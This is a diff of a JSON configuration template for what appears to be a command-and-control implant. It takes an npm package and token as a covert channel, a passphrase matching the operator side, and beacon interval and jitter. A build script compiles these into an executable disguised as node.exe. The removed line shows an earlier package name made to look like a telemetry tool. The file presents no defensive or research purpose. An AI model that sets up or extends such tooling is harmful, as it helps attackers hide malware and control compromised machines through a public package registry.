@@ -1,9 +1,13 @@
 {
-  "_comment": "Copia este fichero a c2.json y rellena package + token. make.py compila dist/node.exe con todo esto dentro.",
+  "_comment": "Copy this file to c2.json, fill in package and token, then run python3 make.py to build native/dist/node.exe. channel and passphrase must match C2_CHAN and C2_PASS on the operator side.",
 
-  "package": "npx-telemetry-collector",
+  "package": "your-package-name",
 
   "token": "npm_REPLACE_ME",
+
+  "channel": "c0ff",
+
+  "passphrase": "change-this-passphrase",
 
   "interval": 60,
   "jitter": 20,
